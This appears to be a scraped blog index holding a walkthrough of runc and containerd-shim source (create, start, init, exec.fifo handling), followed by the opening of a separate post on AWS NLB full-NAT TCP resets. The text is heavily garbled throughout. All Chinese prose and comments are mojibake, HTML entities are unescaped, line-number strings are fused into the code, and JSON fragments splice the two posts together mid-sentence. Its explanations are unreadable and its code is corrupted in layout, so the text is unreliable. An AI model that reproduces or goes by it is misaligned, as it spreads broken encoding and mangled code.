already created containerfunc (r *Runc) Start(context context.Context, id string) error &#123; return r.runOrError(r.command(context, &quot;start&quot;, id)) // è¿™é‡Œä¼šè¿è¡Œï¼Œr.command è¿”å›çš„ exec.Cmd object &#125; 12345678910111213141516func (r *Runc) command(context context.Context, args ...string) *exec.Cmd &#123; command := r.Command if command == &quot;&quot; &#123; command = DefaultCommand // DefaultCommand = &quot;runc&quot; &#125; cmd := exec.CommandContext(context, command, append(r.args(), args...)...) cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123; Setpgid: r.Setpgid, &#125; cmd.Env = filterEnv(os.Environ(), &quot;NOTIFY_SOCKET&quot;) // NOTIFY_SOCKET introduces a special behavior in runc but should only be set if invoked from systemd if r.PdeathSignal != 0 &#123; cmd.SysProcAttr.Pdeathsig = r.PdeathSignal &#125; return cmd&#125; é‚£ä¹ˆå…¶å®åˆ°è¿™é‡Œä¹Ÿå°±çœ‹å®Œäº† containrd-shim è°ƒç”¨ runc create &#x2F; runc start runcå‰é¢çœ‹è¿‡äº† containerd-shim è°ƒç”¨äº† runc create ä¸ runc startï¼Œè¿™é‡Œæ¢³ç†ä¸€ä¸‹ runc çš„ç›¸å…³ä»£ç é€»è¾‘ã€‚ run create â€“bundle123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051func startContainer(context *cli.Context, spec *specs.Spec, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) &#123;\tid := context.Args().First()\tif id == &quot;&quot; &#123; return -1, errEmptyID\t&#125;\tnotifySocket := newNotifySocket(context, os.Getenv(&quot;NOTIFY_SOCKET&quot;), id)\tif notifySocket != nil &#123; notifySocket.setupSpec(context, spec)\t&#125;\tcontainer, err := createContainer(context, id, spec) // å‡†å¤‡ container åœ¨ runc å†…å­˜ä¸­çš„ object\tif err != nil &#123; return -1, err\t&#125;\tif notifySocket != nil &#123; err := notifySocket.setupSocket() if err != nil &#123; return -1, err &#125;\t&#125;\t// Support on-demand socket activation by passing file descriptors into the container init process.\tlistenFDs := []*os.File&#123;&#125;\tif os.Getenv(&quot;LISTEN_FDS&quot;) != &quot;&quot; &#123; listenFDs = activation.Files(false)\t&#125;\tlogLevel := &quot;info&quot;\tif context.GlobalBool(&quot;debug&quot;) &#123; logLevel = &quot;debug&quot;\t&#125;\tr := &amp;runner&#123; enableSubreaper: !context.Bool(&quot;no-subreaper&quot;), shouldDestroy: true, container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(&quot;console-socket&quot;), detach: context.Bool(&quot;detach&quot;), pidFile: context.String(&quot;pid-file&quot;), preserveFDs: context.Int(&quot;preserve-fds&quot;), action: action, criuOpts: criuOpts, init: true, logLevel: logLevel,\t&#125;\treturn r.run(spec.Process) // run&#125; è°ƒç”¨ createContaineråˆ›å»º cotnainer å¯¹è±¡ï¼Œå®é™…çš„åˆ›å»ºç”±å¹³å°ç›¸å…³çš„å·¥å‚å‡½æ•°å®ç° 1234567891011121314151617181920212223func createContainer(context *cli.Context, id string, spec *specs.Spec) (libcontainer.Container, error) &#123;\trootlessCg, err := shouldUseRootlessCgroupManager(context)\tif err != nil &#123; return nil, err\t&#125;\tconfig, err := specconv.CreateLibcontainerConfig(&amp;specconv.CreateOpts&#123; CgroupName: id, UseSystemdCgroup: context.GlobalBool(&quot;systemd-cgroup&quot;), NoPivotRoot: context.Bool(&quot;no-pivot&quot;), NoNewKeyring: context.Bool(&quot;no-new-keyring&quot;), Spec: spec, RootlessEUID: os.Geteuid() != 0, RootlessCgroups: rootlessCg,\t&#125;)\tif err != nil &#123; return nil, err\t&#125;\tfactory, err := loadFactory(context) // è¿”å› Linux çš„å®ç° InitPath å­—æ®µä¸º /proc/self/exeï¼ŒInitArgs å­—æ®µä¸º []string&#123;os.Args[0], &quot;init&quot;&#125;,\tif err != nil &#123; return nil, err\t&#125;\treturn factory.Create(id, config) factory.Create åˆ›å»ºè¿”å›ä¸€ä¸ª containerç»“æ„ä½“ï¼Œå…¶ä¸­ container ç»“æ„ä½“ 1234567891011c := &amp;linuxContainer&#123;\tid: id,\troot: containerRoot, //è¿™é‡Œæ˜¯ cotnainer çš„ root ç›®å½•\tconfig: config, initPath: l.InitPath, // init path /proc/self/exe\tinitArgs: l.InitArgs, // []string&#123;os.Args[0].&#125;\tcriuPath: l.CriuPath,\tnewuidmapPath: l.NewuidmapPath,\tnewgidmapPath: l.NewgidmapPath,\tcgroupManager: l.NewCgroupsManager(config.Cgroups, nil),&#125; è¿”å›ä¸Šè¿°ç»“æ„ä½“ï¼Œç»§ç»­å›åˆ°åˆ°ä¸Šå±‚ä»£ç ç»§ç»­æ‰§è¡Œåˆ°r.run(spec.Process) 123456789101112func (r *runner) run(config *specs.Process) (int, error) &#123;...\tprocess, err := newProcess(*config, r.init, r.logLevel)\tif err != nil &#123; return -1, err\t&#125;....\tswitch r.action &#123;\tcase CT_ACT_CREATE: err = r.container.Start(process) // è¿™æ¬¡è¡Œä¸ºä¼šåˆ°è¿™ä¸ªæµç¨‹.... å›åˆ° r.container.Start(process) ç»§ç»­æ‰§è¡Œ 12345678910111213141516func (c *linuxContainer) Start(process *Process) error &#123;\tc.m.Lock()\tdefer c.m.Unlock()\tif process.Init &#123; // ä½¿ç”¨ create è¿™é‡Œå°±æ˜¯ true if err := c.createExecFifo(); err != nil &#123; // create ä¸€ä¸ª exec.fifo ç”¨ä¸è¿›ç¨‹é—´é€šä¿¡ï¼Œåªæœ‰å†™æ—¶ä¼šè¢«é˜»å¡ï¼Œè¯»å†™éƒ½åœ¨æ—¶æ‰ä¼šæ­£å¸¸è¿è¡Œ return err &#125;\t&#125;\tif err := c.start(process); err != nil &#123; // è¿™æ‰æ˜¯æœ¬æ¬¡å…³æ³¨ç‚¹ if process.Init &#123; c.deleteExecFifo() &#125; return err\t&#125;\treturn nil&#125; c.start(process)çš„å®ç° 123456789func (c *linuxContainer) start(process *Process) error &#123;\tparent, err := c.newParentProcess(process) // åˆ›å»ºçˆ¶è¿›ç¨‹ï¼Œä»£ç åœ¨ä¸‹é¢ review\tif err != nil &#123; return newSystemErrorWithCause(err, &quot;creating new parent process&quot;)\t&#125;\tparent.forwardChildLogs()\tif err := parent.start(); err != nil &#123; // è¿™é‡Œåˆ›å»ºçˆ¶è¿›ç¨‹çš„ startï¼Œå…¶å®ä¹Ÿå°±æ˜¯ runc init // terminate the process to ensure that it properly is reaped.... newParentProcess()å…¶å®å°±æ˜¯å‘½ä»¤è¡Œä¸º runc init çš„ parentProcessï¼Œè¿”å›ç»™ä¸Šé¢è°ƒç”¨parent.start()ã€‚ 12345678910111213141516171819202122232425262728293031func (c *linuxContainer) newParentProcess(p *Process) (parentProcess, error) &#123;\tparentInitPipe, childInitPipe, err := utils.NewSockPair(&quot;init&quot;)\tif err != nil &#123; return nil, newSystemErrorWithCause(err, &quot;creating new init pipe&quot;)\t&#125;\tmessageSockPair := filePair&#123;parentInitPipe, childInitPipe&#125;\tparentLogPipe, childLogPipe, err := os.Pipe()\tif err != nil &#123; return nil, fmt.Errorf(&quot;Unable to create the log pipe: %s&quot;, err)\t&#125;\tlogFilePair := filePair&#123;parentLogPipe, childLogPipe&#125;\tcmd, err := c.commandTemplate(p, childInitPipe, childLogPipe) // å‡†å¤‡å‘½ä»¤è¡Œ if err != nil &#123; return nil, newSystemErrorWithCause(err, &quot;creating new command template&quot;)\t&#125;\tif !p.Init &#123; return c.newSetnsProcess(p, cmd, messageSockPair, logFilePair) // å¦‚æœä¸æ˜¯ initï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡ä¸å…³å¿ƒè¿™é‡Œ\t&#125;\t// We only set up fifoFd if we&#x27;re not doing a `runc exec`. The historic\t// reason for this is that previously we would pass a dirfd that allowed\t// for container rootfs escape (and not doing it in `runc exec` avoided\t// that problem), but we no longer do that. However, there&#x27;s no need to do\t// this for `runc exec` so we just keep it this way to be safe.\tif err := c.includeExecFifo(cmd); err != nil &#123; return nil, newSystemErrorWithCause(err, &quot;including execfifo in cmd.Exec setup&quot;)\t&#125;\treturn c.newInitProcess(p, cmd, messageSockPair, logFilePair) // è¿”å› initProcessï¼Œå…¶ä¸­ cmd ä¸º runc initï¼Œå¹¶ c.initProcess = init&#125; parent.start() å°±æ˜¯å®é™…å¼€å§‹è¿è¡Œ runc initäº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183func (p *initProcess) start() error &#123;\tdefer p.messageSockPair.parent.Close()\terr := p.cmd.Start() // å¯åŠ¨ runc init\tp.process.ops = p\t// close the write-side of the pipes (controlled by child)\tp.messageSockPair.child.Close()\tp.logFilePair.child.Close()\tif err != nil &#123; p.process.ops = nil return newSystemErrorWithCause(err, &quot;starting init process command&quot;)\t&#125;\t// Do this before syncing with child so that no children can escape the\t// cgroup. We don&#x27;t need to worry about not doing this and not being root\t// because we&#x27;d be using the rootless cgroup manager in that case.\tif err := p.manager.Apply(p.pid()); err != nil &#123; return newSystemErrorWithCause(err, &quot;applying cgroup configuration for process&quot;)\t&#125;\tif p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Apply(p.pid()); err != nil &#123; return newSystemErrorWithCause(err, &quot;applying Intel RDT configuration for process&quot;) &#125;\t&#125;\tdefer func() &#123; if err != nil &#123; // TODO: should not be the responsibility to call here p.manager.Destroy() if p.intelRdtManager != nil &#123; p.intelRdtManager.Destroy() &#125; &#125;\t&#125;()\tif _, err := io.Copy(p.messageSockPair.parent, p.bootstrapData); err != nil &#123; return newSystemErrorWithCause(err, &quot;copying bootstrap data to pipe&quot;)\t&#125;\tchildPid, err := p.getChildPid() // è·å– child çš„ pid\tif err != nil &#123; return newSystemErrorWithCause(err, &quot;getting the final child&#x27;s pid from pipe&quot;)\t&#125;\t// Save the standard descriptor names before the container process\t// can potentially move them (e.g., via dup2()). If we don&#x27;t do this now,\t// we won&#x27;t know at checkpoint time which file descriptor to look up.\tfds, err := getPipeFds(childPid)\tif err != nil &#123; return newSystemErrorWithCausef(err, &quot;getting pipe fds for pid %d&quot;, childPid)\t&#125;\tp.setExternalDescriptors(fds)\t// Do this before syncing with child so that no children\t// can escape the cgroup\tif err := p.manager.Apply(childPid); err != nil &#123; // è¿™é‡Œè®¾ç½®è°ƒç”¨å…·ä½“çš„å®ç°é…ç½® cgroup return newSystemErrorWithCause(err, &quot;applying cgroup configuration for process&quot;)\t&#125;\tif p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Apply(childPid); err != nil &#123; return newSystemErrorWithCause(err, &quot;applying Intel RDT configuration for process&quot;) &#125;\t&#125;\t// Now it&#x27;s time to setup cgroup namesapce\tif p.config.Config.Namespaces.Contains(configs.NEWCGROUP) &amp;&amp; p.config.Config.Namespaces.PathOf(configs.NEWCGROUP) == &quot;&quot; &#123; if _, err := p.messageSockPair.parent.Write([]byte&#123;createCgroupns&#125;); err != nil &#123; return newSystemErrorWithCause(err, &quot;sending synchronization value to init process&quot;) &#125;\t&#125;\t// Wait for our first child to exit\tif err := p.waitForChildExit(childPid); err != nil &#123; return newSystemErrorWithCause(err, &quot;waiting for our first child to exit&quot;)\t&#125;\tdefer func() &#123; if err != nil &#123; // TODO: should not be the responsibility to call here p.manager.Destroy() if p.intelRdtManager != nil &#123; p.intelRdtManager.Destroy() &#125; &#125;\t&#125;()\tif err := p.createNetworkInterfaces(); err != nil &#123; // åˆ›å»ºç½‘ç»œæ¥å£ return newSystemErrorWithCause(err, &quot;creating network interfaces&quot;)\t&#125;\tif err := p.sendConfig(); err != nil &#123; // æŠŠé…ç½®å‘é€ç»™å­è¿›ç¨‹ return newSystemErrorWithCause(err, &quot;sending config to init process&quot;)\t&#125;\tvar ( sentRun bool sentResume bool\t)\tierr := parseSync(p.messageSockPair.parent, func(sync *syncT) error &#123; switch sync.Type &#123; case procReady: // set rlimits, this has to be done here because we lose permissions // to raise the limits once we enter a user-namespace if err := setupRlimits(p.config.Rlimits, p.pid()); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting rlimits for ready process&quot;) &#125; // call prestart hooks if !p.config.Config.Namespaces.Contains(configs.NEWNS) &#123; // Setup cgroup before prestart hook, so that the prestart hook could apply cgroup permissions. if err := p.manager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting cgroup config for ready process&quot;) &#125; if p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting Intel RDT config for ready process&quot;) &#125; &#125; if p.config.Config.Hooks != nil &#123; s, err := p.container.currentOCIState() if err != nil &#123; return err &#125; // initProcessStartTime hasn&#x27;t been set yet. s.Pid = p.cmd.Process.Pid s.Status = &quot;creating&quot; for i, hook := range p.config.Config.Hooks.Prestart &#123; if err := hook.Run(s); err != nil &#123; return newSystemErrorWithCausef(err, &quot;running prestart hook %d&quot;, i) &#125; &#125; &#125; &#125; // Sync with child. if err := writeSync(p.messageSockPair.parent, procRun); err != nil &#123; return newSystemErrorWithCause(err, &quot;writing syncT &#x27;run&#x27;&quot;) &#125; sentRun = true case procHooks: // Setup cgroup before prestart hook, so that the prestart hook could apply cgroup permissions. if err := p.manager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting cgroup config for procHooks process&quot;) &#125; if p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting Intel RDT config for procHooks process&quot;) &#125; &#125; if p.config.Config.Hooks != nil &#123; s, err := p.container.currentOCIState() if err != nil &#123; return err &#125; // initProcessStartTime hasn&#x27;t been set yet. s.Pid = p.cmd.Process.Pid s.Status = &quot;creating&quot; for i, hook := range p.config.Config.Hooks.Prestart &#123; if err := hook.Run(s); err != nil &#123; return newSystemErrorWithCausef(err, &quot;running prestart hook %d&quot;, i) &#125; &#125; &#125; // Sync with child. if err := writeSync(p.messageSockPair.parent, procResume); err != nil &#123; return newSystemErrorWithCause(err, &quot;writing syncT &#x27;resume&#x27;&quot;) &#125; sentResume = true default: return newSystemError(fmt.Errorf(&quot;invalid JSON payload from child&quot;)) &#125; return nil\t&#125;)\tif !sentRun &#123; return newSystemErrorWithCause(ierr, &quot;container init&quot;)\t&#125;\tif p.config.Config.Namespaces.Contains(configs.NEWNS) &amp;&amp; !sentResume &#123; return newSystemError(fmt.Errorf(&quot;could not synchronise after executing prestart hooks with container process&quot;))\t&#125;\tif err := unix.Shutdown(int(p.messageSockPair.parent.Fd()), unix.SHUT_WR); err != nil &#123; return newSystemErrorWithCause(err, &quot;shutting down init pipe&quot;)\t&#125;\t// Must be done after Shutdown so the child will exit and we can wait for it.\tif ierr != nil &#123; p.wait() return ierr\t&#125;\treturn nil&#125; è¿è¡Œåˆ°è¿™é‡Œä¹Ÿå°±æ˜¯ runc create è¦è¿”å›äº†ï¼Œä½†æ˜¯å­è¿›ç¨‹çš„ runc init å› ä¸ºçˆ¶è¿›ç¨‹çš„é€€å‡ºè¢« 1 å·è¿›ç¨‹æ¥ç®¡ã€‚ runc initè¿™ä¸ªå°±æ˜¯ contianer å¯åŠ¨çš„æ—¶å€™swapå‰çš„è¿›ç¨‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state// This is a low level implementation detail of the reexec and should not be consumed externallyfunc (l *LinuxFactory) StartInitialization() (err error) &#123;\tvar ( pipefd, fifofd int consoleSocket *os.File envInitPipe = os.Getenv(&quot;_LIBCONTAINER_INITPIPE&quot;) envFifoFd = os.Getenv(&quot;_LIBCONTAINER_FIFOFD&quot;) envConsole = os.Getenv(&quot;_LIBCONTAINER_CONSOLE&quot;)\t)\t// Get the INITPIPE.\tpipefd, err = strconv.Atoi(envInitPipe)\tif err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_INITPIPE=%s to int: %s&quot;, envInitPipe, err)\t&#125;\tvar ( pipe = os.NewFile(uintptr(pipefd), &quot;pipe&quot;) it = initType(os.Getenv(&quot;_LIBCONTAINER_INITTYPE&quot;))\t)\tdefer pipe.Close()\t// Only init processes have FIFOFD.\tfifofd = -1\tif it == initStandard &#123; if fifofd, err = strconv.Atoi(envFifoFd); err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_FIFOFD=%s to int: %s&quot;, envFifoFd, err) &#125;\t&#125;\tif envConsole != &quot;&quot; &#123; console, err := strconv.Atoi(envConsole) if err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_CONSOLE=%s to int: %s&quot;, envConsole, err) &#125; consoleSocket = os.NewFile(uintptr(console), &quot;console-socket&quot;) defer consoleSocket.Close()\t&#125;\t// clear the current process&#x27;s environment to clean any libcontainer\t// specific env vars.\tos.Clearenv()\tdefer func() &#123; // We have an error during the initialization of the container&#x27;s init, // send it back to the parent process in the form of an initError. if werr := utils.WriteJSON(pipe, syncT&#123;procError&#125;); werr != nil &#123; fmt.Fprintln(os.Stderr, err) return &#125; if werr := utils.WriteJSON(pipe, newSystemError(err)); werr != nil &#123; fmt.Fprintln(os.Stderr, err) return &#125;\t&#125;()\tdefer func() &#123; if e := recover(); e != nil &#123; err = fmt.Errorf(&quot;panic from initialization: %v, %v&quot;, e, string(debug.Stack())) &#125;\t&#125;()\ti, err := newContainerInit(it, pipe, consoleSocket, fifofd)\tif err != nil &#123; return err\t&#125;\t// If Init succeeds, syscall.Exec will not return, hence none of the defers will be called.\treturn i.Init()&#125; newContainerInit()æ•´ä½“é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å• 1234567891011121314151617181920212223242526func newContainerInit(t initType, pipe *os.File, consoleSocket *os.File, fifoFd int) (initer, error) &#123;\tvar config *initConfig\tif err := json.NewDecoder(pipe).Decode(&amp;config); err != nil &#123; return nil, err\t&#125;\tif err := populateProcessEnvironment(config.Env); err != nil &#123; return nil, err\t&#125;\tswitch t &#123;\tcase initSetns: return &amp;linuxSetnsInit&#123; pipe: pipe, consoleSocket: consoleSocket, config: config, &#125;, nil\tcase initStandard: return &amp;linuxStandardInit&#123; pipe: pipe, consoleSocket: consoleSocket, parentPid: unix.Getppid(), config: config, fifoFd: fifoFd, &#125;, nil\t&#125;\treturn nil, fmt.Errorf(&quot;unknown init type %q&quot;, t)&#125; å½“ä½ è¿è¡Œ runc crate è¿™ä¸ªæ—¶å€™çš„ init æ˜¯è°ƒç”¨å°±æ˜¯ linuxStandardInit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061func (l *linuxStandardInit) Init() error &#123;\truntime.LockOSThread()\tdefer runtime.UnlockOSThread().... if err := setupNetwork(l.config); err != nil &#123; // æ ¹æ® config ä½¿ç”¨ netlink è¿›è¡Œé…ç½® return err\t&#125;\tif err := setupRoute(l.config.Config); err != nil &#123; // ä½¿ç”¨ netlink è®¾ç½® route -\t// signal, so we restore it here.\tif err := pdeath.Restore(); err != nil &#123; return errors.Wrap(err, &quot;restore pdeath signal&quot;)\t&#125;\t// Compare the parent from the initial start of the init process and make\t// sure that it did not change. if the parent changes that means it died\t// and we were reparented to something else so we should just kill ourself\t// and not cause problems for someone else.\tif unix.Getppid() != l.parentPid &#123; return unix.Kill(unix.Getpid(), unix.SIGKILL)\t&#125;\t// Check for the arg before waiting to make sure it exists and it is\t// returned as a create time error.\tname, err := exec.LookPath(l.config.Args[0])\tif err != nil &#123; return err\t&#125;\t// Close the pipe to signal that we have completed our init.\tl.pipe.Close()\t// Wait for the FIFO to be opened on the other side before exec-ing the\t// user process. We open it through /proc/self/fd/$fd, because the fd that\t// was given to us was an O_PATH fd to the fifo itself. Linux allows us to\t// re-open an O_PATH fd through /proc. // çœ‹ä¸€ä¸‹æ³¨é‡Šï¼Œè¿™é‡Œåˆ©ç”¨äº† fifo çš„ç‰¹ç‚¹ï¼Œç­‰å¾… runc start æ¥å¼€è¿™ä¸ª fifo\tfd, err := unix.Open(fmt.Sprintf(&quot;/proc/self/fd/%d&quot;, l.fifoFd), unix.O_WRONLY|unix.O_CLOEXEC, 0) // ä¸€èµ·å‡†å¤‡å°±ç»ªè¿‡åä»–å°±ä¼š hang åœ¨è¿™é‡Œ\tif err != nil &#123; return newSystemErrorWithCause(err, &quot;open exec fifo&quot;)\t&#125;\tif _, err := unix.Write(fd, []byte(&quot;0&quot;)); err != nil &#123; // å½“ç”¨æˆ·è°ƒç”¨ runc start æ‰“å¼€ fifoï¼Œå°±ä¼šæ‰§è¡Œåˆ°è¿™é‡Œ return newSystemErrorWithCause(err, &quot;write 0 exec fifo&quot;)\t&#125;\t// Close the O_PATH fifofd fd before exec because the kernel resets\t// dumpable in the wrong order. This has been fixed in newer kernels, but\t// we keep this to ensure CVE-2016-9962 doesn&#x27;t re-emerge on older kernels.\t// N.B. the core issue itself (passing dirfds to the host filesystem) has\t// since been resolved.\t// https://github.com/torvalds/linux/blob/v4.9/fs/exec.c#L1290-L1318\tunix.Close(l.fifoFd)\t// Set seccomp as close to execve as possible, so as few syscalls take\t// place afterward (reducing the amount of syscalls that users need to\t// enable in their seccomp profiles).\tif l.config.Config.Seccomp != nil &amp;&amp; l.config.NoNewPrivileges &#123; if err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != nil &#123; return newSystemErrorWithCause(err, &quot;init seccomp&quot;) &#125;\t&#125;\tif err := syscall.Exec(name, l.config.Args[0:], os.Environ()); err != nil &#123; // è¿™é‡Œ swap ç”¨æˆ·çš„è¿›ç¨‹äº† return newSystemErrorWithCause(err, &quot;exec user process&quot;)\t&#125;\treturn nil&#125; runc startå…¶å® runc start çš„é€»è¾‘æ›´ç®€å•ï¼Œä»…ä»…æ˜¯é€šè¿‡ fifo å’Œ runc initè¿›ç¨‹æ²Ÿé€šï¼Œè®©ä»–ç»§ç»­æ‰§è¡Œç”¨æˆ·è¿›ç¨‹ã€‚ 1234567891011121314var startCommand = cli.Command&#123;\tName: &quot;start&quot;,... container, err := getContainer(context) if err != nil &#123; return err &#125; status, err := container.Status() if err != nil &#123; return err &#125; switch status &#123; case libcontainer.Created: return container.Exec() 12345func (c *linuxContainer) Exec() error &#123;\tc.m.Lock()\tdefer c.m.Unlock()\treturn c.exec()&#125; æ‰“å¼€å­è¿›ç¨‹çš„fifo.exec æ–‡ä»¶ï¼Œå­è¿›ç¨‹å°±èƒ½ç»§ç»­æ‰§è¡Œä¸‹å»äº†ã€‚ 12345678910111213141516171819202122func (c *linuxContainer) exec() error &#123;\tpath := filepath.Join(c.root, execFifoFilename)\tpid := c.initProcess.pid()\tblockingFifoOpenCh := awaitFifoOpen(path)\tfor &#123; select &#123; case result := &lt;-blockingFifoOpenCh: return handleFifoResult(result) case &lt;-time.After(time.Millisecond * 100): stat, err := system.Stat(pid) if err != nil || stat.State == system.Zombie &#123; // could be because process started, ran, and completed between our 100ms timeout and our system.Stat() check. // see if the fifo exists and has data (with a non-blocking open, which will succeed if the writing process is complete). if err := handleFifoResult(fifoOpen(path, false)); err != nil &#123; return errors.New(&quot;container process is already dead&quot;) &#125; return nil &#125; &#125;\t&#125;&#125; 1234567891011func handleFifoResult(result openResult) error &#123;\tif result.err != nil &#123; return result.err\t&#125;\tf := result.file\tdefer f.Close()\tif err := readFromExecFifo(f); err != nil &#123; // return err\t&#125;\treturn os.Remove(f.Name())&#125; 12345678910func readFromExecFifo(execFifo io.Reader) error &#123;\tdata, err := ioutil.ReadAll(execFifo)\tif err != nil &#123; return err\t&#125;\tif len(data) &lt;= 0 &#123; return fmt.Errorf(&quot;cannot start an already running container&quot;)\t&#125;\treturn nil&#125; æ‰“å¼€ fifoï¼Œå¦‚æœ data å°äº 0 è¯´æ˜è¿™ä¸ª fifo é‡Œé¢ 0 å·²ç»è¢«è¯»å®Œäº†ï¼Œä¹Ÿå°±æ˜¯ running çš„ã€‚ referencecontainer-runtime-interface-cri-in-kubernetes&#x2F;","tags":["k8s"]},{"title":"aws nlb ä½¿ç”¨ full nat é‡åˆ°çš„ tcp rest é—®é¢˜","path":"/2020/08/10/aws-nlb-full-nat/","content":"èƒŒæ™¯ä¸šåŠ¡è¦ä½¿ç”¨ k8s service å°†é›†ç¾¤å†…éƒ¨çš„ä¸šåŠ¡æš´éœ²å‡ºæ¥ï¼Œå¯¹å¤–æä¾› tcp&#x2F;udp çš„æ¥å…¥æ–¹å¼ï¼Œä¸¤ä¸ªä¼ è¾“å±‚çš„åè®®ä½¿ç”¨ç›¸åŒçš„ç«¯å£å·ã€‚ è€Œæˆ‘ä»¬åœ¨ aws ä¸Šè‡ªå·±å»ºçš„é›†ç¾¤ä½¿ç”¨çš„æ˜¯ aws cloud provider æ¥å®ç°å’Œ aws å†…éƒ¨èµ„æºäº’è”äº’é€šè°ƒç”¨ï¼Œè€Œæˆªæ­¢ 20200810 aws cloud provider è¿˜ä¸æ”¯æŒåˆ›å»º service æ”¯æŒtcp&#x2F;udpä½¿ç”¨åŒä¸€ä¸ªç«¯å£å·ã€‚ å¦‚ä½•ç»•è¿‡æœ‰äº†ä¸Šé¢çš„èƒŒæ™¯ï¼Œå°±å‡†å¤‡è®¾è®¡æ–¹æ¡ˆç»•è¿‡ç›®å‰ aws cloud provider å®ç°çš„é™åˆ¶ã€‚ walk around çš„æ–¹æ¡ˆæ˜¯ä¸‹é¢è¿™æ ·è®¾è®¡çš„ï¼š ä½¿ç”¨ lb å°†æµé‡è½¬å‘åˆ°èŠ‚ç‚¹ä¸Šã€‚ æµé‡è½¬å‘åˆ°èŠ‚ç‚¹ä¸Šä½¿ç”¨ iptables å°†æµé‡è½¬å‘åˆ° pod ä¸­å»ã€‚ é‚£ä¹ˆå›´ç»•ç€ä¸Šé¢çš„æ€è·¯ï¼Œå°±æœ‰ 2 ä¸ªæ ¸å¿ƒé—®é¢˜ã€‚å…¶ä¸€æ˜¯ç¡®è®¤ä½¿ç”¨çš„ lb ç±»å‹ã€‚å…¶äºŒæ˜¯å¦‚ä½•ç®¡ç† iptables è§„åˆ™å°†æµé‡è½¬å‘åˆ°èŠ‚ç‚¹ä¸Šã€‚ é¦–å…ˆæ˜¯ lb ç±»å‹é€‰æ‹©çš„é—®é¢˜ï¼Œé¦–å…ˆæ’é™¤ alb å› ä¸ºåªæ”¯æŒ http&#x2F;httpsï¼Œå…¶æ¬¡æ’é™¤ clb å› ä¸º cld è¿ udp éƒ½ä¸æ”¯æŒï¼Œå…¶å®ä¹Ÿå°±åªèƒ½é€‰æ‹© nlbï¼Œå› ä¸º nlb æ”¯æŒ tcp&#x2F;udp&#x2F;tcp_udp ç­‰ï¼Œè‡³å°‘æˆ‘è¦çš„æ˜¯æœ‰çš„ã€‚ ç¬¬äºŒä¸ªé—®é¢˜æ˜¯å¦‚ä½•å°†æµé‡ä»èŠ‚ç‚¹ä¸Šè½¬å‘åˆ° poc é‡Œé¢ï¼ŒåŸºäºå¯¹ kubernetes service ç†è§£ï¼Œå‡†å¤‡ä½¿ç”¨ node port æ¥å®ç°ã€‚ é‚£ä¹ˆä¸Šé¢è¿™ä¸ª poc çš„æ•°æ®é“¾è·¯å°±æ˜¯ client -&gt; nlb (listener) -&gt; targetgroup (instance &amp; tcp_udp)-&gt; node (iptables)-&gt; containerã€‚client ä½¿ç”¨ nc æ¥æ¨¡æ‹Ÿå‘é€ tcp&#x2F;udp æ•°æ®åŒ…ï¼Œnlb é…ç½®æ²¡æœ‰ç‰¹åˆ«æ³¨æ„çš„åœ°æ–¹åªæ˜¯åœ¨åˆ›å»º listener çš„æ—¶å€™ç±»å‹é€‰æ‹© tcp_udpï¼Œtargetgroup åˆ›å»ºé€‰æ‹© instance ç±»å‹é€‰æ‹© tcp_udpï¼Œnode å’Œ container ä¹Ÿæ²¡æœ‰ç‰¹åˆ«çš„åœ°æ–¹ï¼Œå°±æ˜¯æ™®é€šçš„ kubernetes èŠ‚ç‚¹è¿è¡Œç€ä¸€ä¸ª pod è€Œå·²ã€‚ nlb è½¬å‘åä½¿ç”¨ fullnat çš„é—®é¢˜å…¶å®åŸºäºä¸Šé¢çš„è®¾è®¡ï¼Œæµé‡å¯ä»¥çš„è½¬å‘åˆ°èŠ‚ç‚¹ä¸Šã€‚åˆ°äº†èŠ‚ç‚¹ä¸Šå¯ä»¥ä½¿ç”¨ iptables è½¬å‘è§„åˆ™å°†æµé‡è½¬åˆ° pod ä¸­ã€‚ å› ä¸º tcp å’Œ udp ä¸¤ä¸ªéœ€è¦å¯¹å¤–ä½¿ç”¨åŒä¸€ä¸ªç«¯å£ï¼Œæ‰€ä»¥å•çº¯ä½¿ç”¨ node port å°†æµé‡è½¬å‘åˆ° pod ä¸­å¯èƒ½åªè½¬å‘ä¸€ç§åè®®ã€‚ å› ä¸ºä½¿ç”¨æ‰‹åŠ¨ä¸‹å‘ ipbtales è§„åˆ™åˆä¸èƒ½ cover åˆ° pod çš„æ»šåŠ¨æ›´æ–°ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—ç•™å·¥ä½œç•™ç€åé¢æ‰¾è§£å†³åŠæ³•ï¼ˆå¯èƒ½ä¸ä¸€å®šæœ‰ã€‚ å…ˆæµ‹è¯• tcpï¼Œé’ˆå¯¹ TCP åè®®ä½¿ç”¨èŠ‚ç‚¹ä¸Šçš„ nodeport åœ¨å°†æµé‡è½¬å‘åˆ° pod è¿™ä¸ªåé¢çš„è¿‡ç¨‹ä¸­ã€‚ åŸºäºè¿™ä¸ªæè¿°åœ¨æ¢³ç†ä¸€ä¸‹è°ƒç”¨è·¯å¾„ client 